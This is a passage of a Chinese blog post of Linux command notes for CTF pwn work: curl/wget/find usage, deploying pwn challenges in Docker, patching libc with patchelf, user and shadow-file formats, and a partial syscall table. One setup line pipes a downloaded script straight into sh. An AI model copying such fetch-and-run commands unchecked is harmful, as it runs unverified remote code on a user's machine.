http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class=\"line\">curl -X POST --data-urlencode &quot;date&#x3D;April 1&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class=\"line\"></span><br><span class=\"line\">#http动词</span><br><span class=\"line\">curl -X POST www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#文件上传</span><br><span class=\"line\">表单这样的话</span><br><span class=\"line\">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;</span><br><span class=\"line\">　　　　&lt;input type&#x3D;file name&#x3D;upload&gt;</span><br><span class=\"line\">　　　　&lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">可以用curl</span><br><span class=\"line\">curl --form upload&#x3D;xxx --form press&#x3D;xxx [URL]</span><br><span class=\"line\"></span><br><span class=\"line\">#Referer字段</span><br><span class=\"line\">curl --referer http:&#x2F;&#x2F;www.baidu.com http:&#x2F;&#x2F;www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#User agent</span><br><span class=\"line\">curl --user-agent &#39;[User Agent]&#39; [URL]</span><br><span class=\"line\"></span><br><span class=\"line\">#cookie</span><br><span class=\"line\">curl --cookir &quot;id&#x3D;xxx&quot; www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#增加头信息</span><br><span class=\"line\">curl --header &quot;Content-Type:application&#x2F;json&quot; www.baidu.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"wget\"><a href=\"#wget\" class=\"headerlink\" title=\"wget\"></a>wget</h2><p>Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;使用wget下载单个文件</span><br><span class=\"line\">wget http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;使用wget -O下载并以不同的文件名保存</span><br><span class=\"line\">wget -O wordpress.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;使用wget –limit -rate限速下载</span><br><span class=\"line\">wget --limit-rate&#x3D;300k http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;伪装代理名称下载</span><br><span class=\"line\">wget --user-agent&#x3D;“Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit&#x2F;534.16 (KHTML, like Gecko) Chrome&#x2F;10.0.648.204 Safari&#x2F;534.16” http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;使用wget –spider测试下载链接</span><br><span class=\"line\">wget --spider URL</span><br><span class=\"line\">正确会返回200，错误返回404</span><br></pre></td></tr></table></figure>\n<h2 id=\"tar\"><a href=\"#tar\" class=\"headerlink\" title=\"tar\"></a>tar</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xzvf  *.tar.gz</span><br><span class=\"line\">      tar [-cxtzjvfpPN] 文件与目录 ....</span><br><span class=\"line\">      参数：</span><br><span class=\"line\">      -c ：建立一个压缩文件的参数指令(create 的意思)；</span><br><span class=\"line\">      -x ：解开一个压缩文件的参数指令！</span><br><span class=\"line\">      -t ：查看 tarfile 里面的文件！</span><br><span class=\"line\">      特别注意，在参数的下达中， c&#x2F;x&#x2F;t 仅能存在一个！不可同时存在！</span><br><span class=\"line\">      因为不可能同时压缩与解压缩。</span><br><span class=\"line\">      -z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩？</span><br><span class=\"line\">      -j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2 压缩？</span><br><span class=\"line\">      -v ：压缩的过程中显示文件！这个常用，但不建议用在背景执行过程！</span><br><span class=\"line\">      -f ：使用档名，请留意，在 f 之后要立即接档名喔！不要再加参数！</span><br></pre></td></tr></table></figure>\n<h2 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h2><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;直接查询</span><br><span class=\"line\">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"find\"><a href=\"#find\" class=\"headerlink\" title=\"find\"></a>find</h2><p><a href=\"https://www.cnblogs.com/Ido-911/p/9638612.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Ido-911/p/9638612.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#根据文件名称查找文件</span></span><br><span class=\"line\"><span class=\"comment\">#查找文件</span></span><br><span class=\"line\">find test.c  //感觉不太常用</span><br><span class=\"line\"><span class=\"comment\">#从主目录下查找test文件</span></span><br><span class=\"line\">find / -name <span class=\"built_in\">test</span></span><br><span class=\"line\"><span class=\"comment\">#从主目录下查找test目录</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> d -name <span class=\"built_in\">test</span></span><br><span class=\"line\"><span class=\"comment\">#从主目录下找flag文件</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name flag.txt</span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name flag.php</span><br><span class=\"line\"><span class=\"comment\">#从主目录下查找所有的txt文件或php文件</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.txt\"</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.php\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#根据文件权限来查找文件</span></span><br><span class=\"line\"><span class=\"comment\">#查找777权限的文件</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -perm 0777 -<span class=\"built_in\">print</span></span><br><span class=\"line\"><span class=\"comment\">#查找没有777权限的文件(主要查找当前目录)</span></span><br><span class=\"line\">find -<span class=\"built_in\">type</span> f ! -perm 777</span><br><span class=\"line\"><span class=\"comment\">#查找只读文件</span></span><br><span class=\"line\">find / -perm /u=r</span><br><span class=\"line\"><span class=\"comment\">#查找可执行文件</span></span><br><span class=\"line\">find -perm /a=x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#根据日期和时间查找文件和目录</span></span><br><span class=\"line\"><span class=\"comment\">#最近1小时内查找更改的文件</span></span><br><span class=\"line\">find / -cmin -60</span><br><span class=\"line\"><span class=\"comment\">#最近1小时内查找修改的文件</span></span><br><span class=\"line\">find / -mmin -60</span><br><span class=\"line\"><span class=\"comment\">#查找最近1小时内访问的文件</span></span><br><span class=\"line\">find / -amin -60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#根据文件大小查找文件</span></span><br><span class=\"line\"><span class=\"comment\">#找到50mb的文件</span></span><br><span class=\"line\">find / -size 50M</span><br><span class=\"line\"><span class=\"comment\">#找到50mb-100mb的文件</span></span><br><span class=\"line\">find / -size +50M -size -100M</span><br></pre></td></tr></table></figure>\n<h2 id=\"ps\"><a href=\"#ps\" class=\"headerlink\" title=\"ps\"></a>ps</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep xx  &#x2F;&#x2F;查看有关进程</span><br><span class=\"line\">pstree  \t\t\t\t\t&#x2F;&#x2F;进程树</span><br><span class=\"line\">pidof xx \t\t\t\t\t&#x2F;&#x2F;查看相关pid</span><br></pre></td></tr></table></figure>\n<h2 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"grep\"></a>grep</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep [options]</span><br><span class=\"line\">    主要参数：  grep --help可查看</span><br><span class=\"line\">        -c：只输出匹配行的计数。</span><br><span class=\"line\">        -i：不区分大小写。</span><br><span class=\"line\">        -h：查询多文件时不显示文件名。</span><br><span class=\"line\">        -l：查询多文件时只输出包含匹配字符的文件名。</span><br><span class=\"line\">        -n：显示匹配行及 行号。</span><br><span class=\"line\">        -s：不显示不存在或无匹配文本的错误信息。</span><br><span class=\"line\">        -v：显示不包含匹配文本的所有行。</span><br><span class=\"line\">        --color&#x3D;auto ：可以将找到的关键词部分加上颜色的显示。</span><br></pre></td></tr></table></figure>\n<h2 id=\"chown\"><a href=\"#chown\" class=\"headerlink\" title=\"chown\"></a>chown</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chown root demo</span><br><span class=\"line\">&#x2F;&#x2F;将demo所有者设为root</span><br><span class=\"line\">chown -R root:root *</span><br><span class=\"line\">&#x2F;&#x2F;将当前目录下所有文件和子目录拥有者都设为root，群体使用者也为root</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x03部署pwn题目\"><a href=\"#0x03部署pwn题目\" class=\"headerlink\" title=\"0x03部署pwn题目\"></a>0x03部署pwn题目</h1><p><a href=\"https://github.com/giantbranch/pwn_deploy_chroot\" target=\"_blank\" rel=\"noopener\">https://github.com/giantbranch/pwn_deploy_chroot</a></p>\n<h2 id=\"pwn-deploy-chroot介绍\"><a href=\"#pwn-deploy-chroot介绍\" class=\"headerlink\" title=\"pwn_deploy_chroot介绍\"></a>pwn_deploy_chroot介绍</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><blockquote>\n<ol>\n<li>一次可以部署多个题目到一个docker容器中</li>\n<li>自动生成flag,并备份到当前目录</li>\n<li>也是基于xinted + docker + chroot</li>\n<li>利用python脚本根据pwn的文件名自动化地生成3个文件：pwn.xinetd，Dockerfile和docker-compose.yml</li>\n<li>在/bin目录，利用自己编写的静态编译的catflag程序作为/bin/sh,这样的话，system(“/bin/sh”)实际执行的只是读取flag文件的内容，完全不给搅屎棍任何操作的余地</li>\n<li>默认从10000端口监听，多一个程序就+1，起始的监听端口可以在config.py配置，或者生成pwn.xinetd和docker-compose.yml后自己修改这两个文件</li>\n</ol>\n</blockquote>\n<h3 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 安装docker</span><br><span class=\"line\">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br><span class=\"line\"># 安装 docker compose 和git</span><br><span class=\"line\">apt install docker-compose git</span><br><span class=\"line\"># 下载</span><br><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>只需要3步：</p>\n<blockquote>\n<ol>\n<li>将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li>\n<li>python <a href=\"http://initialize.py/\" target=\"_blank\" rel=\"noopener\">initialize.py</a></li>\n<li>docker-compose up —build -d</li>\n</ol>\n</blockquote>\n<p>下面给下详细操作：</p>\n<p>1、将你要部署的pwn题目放到bin目录</p>\n<p>我的项目已经将一个程序copy了3分作为示例，注意文件名不要含有特殊字符，文件名建议使用字母，下划线，横杆和数字，当然全字母的当然最好了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# ls bin&#x2F;</span><br><span class=\"line\">pwn1  pwn1_copy1  pwn1_copy2</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>2、<a href=\"http://xn--initialize-3f62aw61d.py/\" target=\"_blank\" rel=\"noopener\">运行initialize.py</a></p>\n<p>运行脚本后会输出每个pwn的监听端口，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# python initialize.py</span><br><span class=\"line\"></span><br><span class=\"line\">pwn1&#39;s port: 10000</span><br><span class=\"line\">pwn1_copy1&#39;s port: 10001</span><br><span class=\"line\">pwn1_copy2&#39;s port: 10002</span><br></pre></td></tr></table></figure>\n<p>文件与端口信息，还有随机生成的flag默认备份到flags.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# cat flags.txt </span><br><span class=\"line\">pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;</span><br><span class=\"line\">pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;</span><br><span class=\"line\">pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pwn1&#39;s port: 10000</span><br><span class=\"line\">pwn1_copy1&#39;s port: 10001</span><br><span class=\"line\">pwn1_copy2&#39;s port: 10002</span><br><span class=\"line\">12345678</span><br></pre></td></tr></table></figure>\n<p>3、启动环境</p>\n<p>请使用root用户执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up --build -d</span><br></pre></td></tr></table></figure>\n<p>不出意外，题目就启动起来了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@instance-1:~&#x2F;pwn_deploy_chroot# netstat -antp | grep docker</span><br><span class=\"line\">tcp6       0      0 :::10002                :::*                    LISTEN      19828&#x2F;docker-proxy</span><br><span class=\"line\">tcp6       0      0 :::10000                :::*                    LISTEN      19887&#x2F;docker-proxy</span><br><span class=\"line\">tcp6       0      0 :::10001                :::*                    LISTEN      19873&#x2F;docker-proxy</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x04-加载不同的libc\"><a href=\"#0x04-加载不同的libc\" class=\"headerlink\" title=\"0x04 加载不同的libc\"></a>0x04 加载不同的libc</h1><p>下载patchelf</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;codechina.csdn.net&#x2F;mirrors&#x2F;NixOS&#x2F;patchelf.git</span><br></pre></td></tr></table></figure>\n<p>下载glibc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;matrix1001&#x2F;glibc-all-in-one</span><br></pre></td></tr></table></figure>\n<p><strong>glibc</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;update_list</span><br><span class=\"line\">cat list</span><br><span class=\"line\">.&#x2F;download xxlibc &#x2F;&#x2F;下载需要的libc</span><br></pre></td></tr></table></figure>\n<p><strong>patchelf</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install autoconf automake libtool</span><br><span class=\"line\">.&#x2F;bootstrap.sh</span><br><span class=\"line\">.&#x2F;configure</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br><span class=\"line\">make check</span><br></pre></td></tr></table></figure>\n<h2 id=\"生成符号链接\"><a href=\"#生成符号链接\" class=\"headerlink\" title=\"生成符号链接\"></a>生成符号链接</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &#x2F;lib64</span><br><span class=\"line\">sudo su</span><br><span class=\"line\">sudo ln -s &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so .&#x2F;2.27-ld.so.2</span><br></pre></td></tr></table></figure>\n<h2 id=\"更换elf文件的ld和libc\"><a href=\"#更换elf文件的ld和libc\" class=\"headerlink\" title=\"更换elf文件的ld和libc\"></a>更换elf文件的ld和libc</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">patchelf --set-interpreter &#x2F;lib64&#x2F;2.27-ld.so.2 .&#x2F;tcache</span><br><span class=\"line\">patchelf --replace-needed libc.so.6 ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;libc-2.27.so .&#x2F;tcache</span><br><span class=\"line\">patchelf --set-interpreter &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so  --set-rpath  ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64 tcache</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x06-用户和权限\"><a href=\"#0x06-用户和权限\" class=\"headerlink\" title=\"0x06 用户和权限\"></a>0x06 用户和权限</h1><h2 id=\"1-用户\"><a href=\"#1-用户\" class=\"headerlink\" title=\"1.用户\"></a>1.用户</h2><h3 id=\"1-1-用户标识号\"><a href=\"#1-1-用户标识号\" class=\"headerlink\" title=\"1.1 用户标识号\"></a>1.1 用户标识号</h3><p>0： root，超级用户。<br>1-499：系统用户，保证系统服务正常运行，一般不使用。<br>500-60000：普通用户，可登录系统，拥有一定的权限。管理员添加的用户在此范围内。</p>\n<p>用户名和标识号不一定一一对应，Linux允许几个登录名对应同一个用户标识号。</p>\n<p>系统内部管理进程和文件访问权限时使用用户标识号。</p>\n<p>账号和标识号的对应关系在/etc/passwd文件中。</p>\n<h3 id=\"1-2-etc-passwd\"><a href=\"#1-2-etc-passwd\" class=\"headerlink\" title=\"1.2 /etc/passwd\"></a>1.2 /etc/passwd</h3><p><strong>该文件所有者和所属组为root</strong>，除了root用户外只有读取的权限。</p>\n<p>格式为</p>\n<p>登录名：口令：用户标识号：组标识号：注释：用户主目录：Shell程序</p>\n<blockquote>\n<p>登录名：同意系统中唯一，大小敏感。<br>口令：密码，root和用户可使用passwd命令修改。<br>用户标识号：唯一。<br>组标识号：每个用户可以同时属于多个组。<br>注释：相关信息，真实姓名、联系电话等。mail和finger等会使用这些信息。<br>用户主目录：用户登录后的默认工作目录。root为/root，一般用户在/home下。<br>Shell程序：登录后默认启动的Shell程序。</p>\n</blockquote>\n<h3 id=\"1-3-etc-shadow\"><a href=\"#1-3-etc-shadow\" class=\"headerlink\" title=\"1.3 /etc/shadow\"></a>1.3 /etc/shadow</h3><p>包含用户的密码和过期时间，只有root组可读写。</p>\n<p>格式为</p>\n<p>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：密码禁用期：账户失效时间：保留字段</p>\n<blockquote>\n<p>登录名：略。<br>加密口令：*表示账户被锁定，！表示密码被锁定。其他的前三位表示加密方式。<br>最后一次修改时间：最近修改密码的时间，天为单位，1970年1月1日算起。<br>最小时间间隔：最小修改密码的时间间隔。<br>最大时间间隔：最长密码有效期，到期要求修改密码。<br>警告时间：密码过期后多久发出警告。<br>密码禁用期：密码过期后仍然接受的最长期限。<br>账号失效时间：账户的有效期，1970年1月1日算起，空串表示永不过期。<br>保留字段：保留将来使用。</p>\n</blockquote>\n<h2 id=\"2-用户组\"><a href=\"#2-用户组\" class=\"headerlink\" title=\"2.用户组\"></a>2.用户组</h2><p>Linux本身预定义了许多用户组，包括root、daemon、bin、sys等，用户可根据需要自行添加用户组。</p>\n<p>用户组拥有组名、组标识号、组成员等属性。</p>\n<h3 id=\"2-1-etc-group\"><a href=\"#2-1-etc-group\" class=\"headerlink\" title=\"2.1 /etc/group\"></a>2.1 /etc/group</h3><p>格式为</p>\n<p>组名：口令：组标识号：成员列表</p>\n<h2 id=\"3-用户管理\"><a href=\"#3-用户管理\" class=\"headerlink\" title=\"3. 用户管理\"></a>3. 用户管理</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//add</span><br><span class=\"line\">useradd [option] 登录名</span><br><span class=\"line\">//如果没有指定–system和–group选项，则创建普通用户。</span><br><span class=\"line\">adduser [option] user</span><br><span class=\"line\"></span><br><span class=\"line\">//del</span><br><span class=\"line\">userdel [option] 用户名</span><br><span class=\"line\">-f：强制删除（谨慎使用）</span><br><span class=\"line\">-r：主目录中的文件一并删除。</span><br><span class=\"line\"></span><br><span class=\"line\">//edit passwd</span><br><span class=\"line\">passwd [option] 登录名</span><br><span class=\"line\"></span><br><span class=\"line\">//show user information</span><br><span class=\"line\">id [option] [用户]</span><br><span class=\"line\"></span><br><span class=\"line\">//change user</span><br><span class=\"line\">su [option] [用户名]</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-用户组管理\"><a href=\"#4-用户组管理\" class=\"headerlink\" title=\"4.用户组管理\"></a>4.用户组管理</h2><p>把user换成group</p>\n<h1 id=\"0x07-一些小问题\"><a href=\"#0x07-一些小问题\" class=\"headerlink\" title=\"0x07 一些小问题\"></a>0x07 一些小问题</h1><h2 id=\"1-外网ip\"><a href=\"#1-外网ip\" class=\"headerlink\" title=\"1.外网ip\"></a>1.外网ip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl ifconfig.me</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-系统调用号\"><a href=\"#2-系统调用号\" class=\"headerlink\" title=\"2.系统调用号\"></a>2.系统调用号</h2><h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h &gt; syscall.list</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>系统调用</th>\n<th>调用号</th>\n<th>系统调用</th>\n<th>调用号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exit</td>\n<td>1</td>\n<td>fork</td>\n<td>2</td>\n</tr>\n<tr>\n<td>read</td>\n<td>3</td>\n<td>write</td>\n<td>4</td>\n</tr>\n<tr>\n<td>open</td>\n<td>5</td>\n<td>close</td>\n<td>6</td>\n</tr>\n<tr>\n<td>waitpid</td>\n<td>7</td>\n<td>creat</td>\n<td>8</td>\n</tr>\n<tr>\n<td>link</td>\n<td>9</td>\n<td>unlink</td>\n<td>10</td>\n</tr>\n<tr>\n<td>execve</td>\n<td>11</td>\n<td>chdir</td>\n<td>12</td>\n</tr>\n<tr>\n<td>time</td>\n<td>13</td>\n<td>mknod</td>\n<td>14</td>\n</tr>\n<tr>\n<td>chmod</td>\n<td>15</td>\n<td>lchown</td>\n<td>16</td>\n</tr>\n<tr>\n<td>break</td>\n<td>17</td>\n<td>oldstat</td>\n<td>18</td>\n</tr>\n<tr>\n<td>lseek</td>\n<td>19</td>\n<td>getpid</td>\n<td>20</td>\n</tr>\n<tr>\n<td>mount</td>\n<td>21</td>\n<td>umount</td>\n<td>22</td>\n</tr>\n<tr>\n<td>setuid</td>\n<td>23</td>\n<td>getuid</td>\n<td>24</td>\n</tr>\n<tr>\n<td>stime</td>\n<td>25</td>\n<td>ptrace</td>\n<td>26</td>\n</tr>\n<tr>\n<td>alarm</td>\n<td>27</td>\n<td>oldfstat</td>\n<td>28</td>\n</tr>\n<tr>\n<td>pause</td>\n<td>29</td>\n<td>utime</td>\n<td>30</td>\n</tr>\n<tr>\n<td>stty</td>\n<td>31</td>\n<td>gtty</td>\n<td>32</td>\n</tr>\n<tr>\n<td>access</td>\n<td>33</td>\n<td>nice</td>\n<td>34</td>\n</tr>\n<tr>\n<td>ftime</td>\n<td>35</td>\n<td>sync</td>\n<td>36</td>\n</tr>\n<tr>\n<td>kill</td>\n<td>37</td>\n<td>rename</td>\n<td>38</td>\n</tr>\n<tr>\n<td>mkdir</td>\n<td>39</td>\n<td>rmdir</td>\n<td>40</td>\n</tr>\n<tr>\n<td>dup</td>\n<td>41</td>\n<td>pipe</td>\n<td>42</td>\n</tr>\n<tr>\n<td>times</td>\n<td>43</td>\n<td>prof</td>\n<td>44</td>\n</tr>\n<tr>\n<td>brk</td>\n<td>45</td>\n<td>setgid</td>\n<td>46</td>\n</tr>\n<tr>\n<td>getgid</td>\n<td>47</td>\n<td>signal</td>\n<td>48</td>\n</tr